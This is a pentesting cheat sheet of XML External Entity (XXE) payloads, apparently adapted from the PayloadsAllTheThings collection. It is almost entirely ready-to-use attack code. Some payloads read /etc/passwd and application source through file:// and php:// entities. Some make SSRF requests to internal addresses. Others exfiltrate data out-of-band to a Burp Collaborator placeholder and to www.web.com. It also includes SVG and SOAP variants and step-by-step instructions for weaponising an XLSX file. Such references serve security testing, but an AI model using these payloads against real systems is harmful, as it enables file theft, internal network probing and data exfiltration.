# XML External Entity \(XXE\)

## Exploiting XXE to retrieve files

### Classic XXE

Display content of `/etc/passwd.`

```bash
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>
```

```bash
<?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
```

### Classic XXE Base64 encoded

Base64 string == `file://etc/passwd`

```bash
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```

### PHP Wrapper inside XXE

```bash
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY % xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php" >
]>
<foo>&xxe;</foo>
```

### Xinclude attack

```bash
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

## Exploiting XXE to perform SSRF attacks

```bash
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY % xxe SYSTEM "http://127.0.0.1:5000/secret_pass.txt" >
]>
<foo>&xxe;</foo>
```

## Exploiting blind XXE to exfiltrate data out-of-band

Sometimes you won't have a result outputted in the page but you can still extract the data with an out of band attack.

### Blind XXE

The easiest way to test for a blind XXE is to try to load a remote resource such as a Burp Collaborator.

```bash
<?xml version="1.0" ?>
<!DOCTYPE root [
<!ENTITY % ext SYSTEM "http://YOURBURCOLLABORATOR.net/x"> %ext;
]>
<r></r>
```

Send the content of `/etc/passwd` to `www.web.com` \(you may receive only the first line\).

```bash
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY % xxe SYSTEM "file:///etc/passwd" >
<!ENTITY callhome SYSTEM "www.web.com/?%xxe;">
]
>
<foo>&callhome;</foo>
```

## XXE in weird files

### XXE inside SVG

```bash
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
    <image xlink:href="expect://ls" width="200" height="200"></image>
</svg>
```

### XXE inside SOAP

```bash
<soap:Body>
  <foo>
    <![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]>
  </foo>
</soap:Body>
```

### XXE inside XLSX file

Extract the excel file.

```bash
$ mkdir XXE && cd XXE
$ unzip ../XXE.xlsx
Archive:  ../XXE.xlsx
  inflating: xl/drawings/drawing1.xml
  inflating: xl/worksheets/sheet1.xml
  inflating: xl/worksheets/_rels/sheet1.xml.rels
  inflating: xl/sharedStrings.xml
  inflating: xl/styles.xml
  inflating: xl/workbook.xml
  inflating: xl/_rels/workbook.xml.rels
  inflating: _rels/.rels
  inflating: [Content_Types].xml
```

Add your blind XXE payload inside `xl/workbook.xml`.

```bash
<xml...>
<!DOCTYPE x [ <!ENTITY xxe SYSTEM "http://YOURCOLLABORATORID.burpcollaborator.net/"> ]>
<x>&xxe;</x>
<workbook...>
```

Alternativly, add your payload in `xl/sharedStrings.xml`:

```bash
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [ <!ELEMENT t ANY > <!ENTITY xxe SYSTEM "http://YOURCOLLABORATORID.burpcollaborator.net/"> ]>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="10" uniqueCount="10"><si><t>&xxe;</t></si><si><t>testA2</t></si><si><t>testA3</t></si><si><t>testA4</t></si><si><t>testA5</t></si><si><t>testB1</t></si><si><t>testB2</t></si><si><t>testB3</t></si><si><t>testB4</t></si><si><t>testB5</t></si></sst>
```

Rebuild the Excel file.

```text
$ zip -r ../poc.xlsx *
updating: [Content_Types].xml (deflated 71%)
updating: _rels/ (stored 0%)
updating: _rels/.rels (deflated 60%)
updating: docProps/ (stored 0%)
updating: docProps/app.xml (deflated 51%)
updating: docProps/core.xml (deflated 50%)
updating: xl/ (stored 0%)
updating: xl/workbook.xml (deflated 56%)
updating: xl/worksheets/ (stored 0%)
updating: xl/worksheets/sheet1.xml (deflated 53%)
updating: xl/styles.xml (deflated 60%)
updating: xl/theme/ (stored 0%)
updating: xl/theme/theme1.xml (deflated 80%)
updating: xl/_rels/ (stored 0%)
updating: xl/_rels/workbook.xml.rels (deflated 66%)
updating: xl/sharedStrings.xml (deflated 17%)
```

## References

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection\#exploiting-xxe-to-retrieve-files" %}



